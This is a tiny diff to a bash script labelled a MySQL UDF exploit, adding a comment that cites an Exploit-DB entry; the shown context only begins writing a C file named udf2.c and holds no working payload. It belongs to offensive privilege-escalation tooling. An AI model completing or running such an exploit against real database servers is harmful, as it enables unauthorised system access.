@@ -1,6 +1,7 @@
 #!/bin/bash
 # mysql_udf exploit with 1 hit
 # @404death
+# Exploit-db : https://www.exploit-db.com/exploits/1518
 
 cat <<EOF > udf2.c
 #include <stdio.h>
